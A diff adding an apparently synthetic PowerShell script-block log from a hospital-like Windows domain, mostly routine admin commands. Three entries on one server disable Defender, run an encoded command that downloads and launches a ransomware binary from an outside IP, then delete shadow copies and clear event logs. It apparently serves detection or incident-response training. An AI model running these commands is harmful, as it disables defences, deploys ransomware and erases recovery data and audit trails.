@@ -1,0 +1,379 @@
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T06:00:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\bagentsvc
+ScriptBlockId: {gen-0001}
+ScriptBlockText:
+Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object Name
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T06:31:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\jweber
+ScriptBlockId: {gen-0002}
+ScriptBlockText:
+Get-DnsClientCache | Select-Object Entry, Data
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T07:14:00.0000000Z
+Computer:      STMUNGOS-SER-118
+UserID:        STMUNGOS\rmehta
+ScriptBlockId: {gen-0003}
+ScriptBlockText:
+Get-NetIPAddress -InterfaceFamily IPv4 | Select-Object IPAddress, InterfaceAlias
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T07:58:00.0000000Z
+Computer:      WKS-330
+UserID:        STMUNGOS\nshapiro
+ScriptBlockId: {gen-0004}
+ScriptBlockText:
+New-Item -ItemType Directory -Path C:\Temp\CertRenewal -Force
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T08:29:00.0000000Z
+Computer:      STMUNGOS-SER-118
+UserID:        STMUNGOS\ncastillo
+ScriptBlockId: {gen-0005}
+ScriptBlockText:
+Install-WindowsUpdate -AcceptAll -AutoReboot
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T09:09:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\afischer
+ScriptBlockId: {gen-0006}
+ScriptBlockText:
+Clear-RecycleBin -Force -Confirm:$false
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T09:58:00.0000000Z
+Computer:      WKS-402
+UserID:        STMUNGOS\lchen
+ScriptBlockId: {gen-0007}
+ScriptBlockText:
+Get-Volume | Select-Object DriveLetter, HealthStatus
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T10:46:00.0000000Z
+Computer:      WKS-290
+UserID:        STMUNGOS\asato
+ScriptBlockId: {gen-0008}
+ScriptBlockText:
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T11:36:00.0000000Z
+Computer:      WKS-330
+UserID:        STMUNGOS\pnovakova
+ScriptBlockId: {gen-0009}
+ScriptBlockText:
+Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 10
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T12:29:00.0000000Z
+Computer:      WKS-330
+UserID:        STMUNGOS\dvoss
+ScriptBlockId: {gen-0010}
+ScriptBlockText:
+Get-HotFix | Sort-Object InstalledOn -Descending
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T13:15:00.0000000Z
+Computer:      WKS-330
+UserID:        STMUNGOS\lchen
+ScriptBlockId: {gen-0011}
+ScriptBlockText:
+Restart-Computer -Force -Confirm:$false
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T14:10:00.0000000Z
+Computer:      WKS-402
+UserID:        STMUNGOS\mrathi
+ScriptBlockId: {gen-0012}
+ScriptBlockText:
+Get-DnsClientCache | Select-Object Entry, Data
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T14:35:48.0000000Z
+Computer:      STMUNGOS-SER-203
+UserID:        STMUNGOS\bjorkins
+ScriptBlockId: {8e2f1a90-001}
+ScriptBlockText:
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Add-MpPreference -ExclusionPath "C:\ProgramData\Locker\"
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T14:40:02.0000000Z
+Computer:      STMUNGOS-SER-203
+UserID:        STMUNGOS\bjorkins
+ScriptBlockId: {8e2f1a90-002}
+ScriptBlockText:
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JHdjID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50DQokd2MuRG93bmxvYWRGaWxlKCJoeHhwOi8vMTg1LjIyMC4xMDEuNDc6ODA4MC9zdGFnZTIvbWVkbG9ja2VyLmV4ZSIsIkM6XFByb2dyYW1EYXRhXExvY2tlclxtZWRsb2NrZXIuZXhlIikNCk5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICJDOlxQcm9ncmFtRGF0YVxMb2NrZXJcIg0KaWNhY2xzICJDOlxQcm9ncmFtRGF0YVxMb2NrZXJcIiAvZ3JhbnQgRXZlcnlvbmU6Rg0KU3RhcnQtU2xlZXAgLVNlY29uZHMgNQ0KU3RhcnQtUHJvY2VzcyAiQzpcUHJvZ3JhbURhdGFcTG9ja2VyXG1lZGxvY2tlci5leGUiIC1Bcmd1bWVudExpc3QgIi0taW5pdCI=
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T14:41:55.0000000Z
+Computer:      STMUNGOS-SER-203
+UserID:        STMUNGOS\bjorkins
+ScriptBlockId: {8e2f1a90-003}
+ScriptBlockText:
+Get-WmiObject Win32_ShadowCopy | Remove-WmiObject
+Clear-EventLog -LogName Security,System,Application
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T14:44:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\bagentsvc
+ScriptBlockId: {gen-0013}
+ScriptBlockText:
+Copy-Item -Path \\fileserver\deploy\agent.msi -Destination C:\Temp\agent.msi
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T15:32:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\jkoh2
+ScriptBlockId: {gen-0014}
+ScriptBlockText:
+Invoke-WebRequest -Uri https://cert.stmungos-internal.local/renew -UseBasicParsing
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T16:07:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\obergstrom
+ScriptBlockId: {gen-0015}
+ScriptBlockText:
+Copy-Item -Path \\fileserver\deploy\agent.msi -Destination C:\Temp\agent.msi
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T16:37:00.0000000Z
+Computer:      WKS-330
+UserID:        STMUNGOS\epetrova
+ScriptBlockId: {gen-0016}
+ScriptBlockText:
+Test-Connection -ComputerName emr.stmungos-internal.local -Count 2
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T17:27:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\rchandran
+ScriptBlockId: {gen-0017}
+ScriptBlockText:
+Get-SmbShare | Select-Object Name, Path
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T18:05:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\rchandran
+ScriptBlockId: {gen-0018}
+ScriptBlockText:
+New-Item -ItemType Directory -Path C:\Temp\CertRenewal -Force
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T18:56:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\dvoss
+ScriptBlockId: {gen-0019}
+ScriptBlockText:
+Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 10
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T19:33:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\jkoh
+ScriptBlockId: {gen-0020}
+ScriptBlockText:
+Get-SmbShare | Select-Object Name, Path
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T20:19:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\jweber
+ScriptBlockId: {gen-0021}
+ScriptBlockText:
+Get-ADUser -Filter {Department -eq 'Radiology'} -Properties Department
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T21:12:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\kasante
+ScriptBlockId: {gen-0022}
+ScriptBlockText:
+Start-Process msiexec.exe -ArgumentList '/i C:\Temp\agent.msi /quiet' -Wait
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T22:05:00.0000000Z
+Computer:      WKS-448
+UserID:        STMUNGOS\afischer
+ScriptBlockId: {gen-0023}
+ScriptBlockText:
+Restart-Service -Name PrintNotify -Force
+
+--------------------------------------------------------------------------------
+
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Event ID:      4104
+Task Category: Execute a Remote Command
+
+TimeCreated:   2026-02-14T22:35:00.0000000Z
+Computer:      WKS-511
+UserID:        STMUNGOS\emrsvc
+ScriptBlockId: {gen-0024}
+ScriptBlockText:
+Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object Name
+
+--------------------------------------------------------------------------------
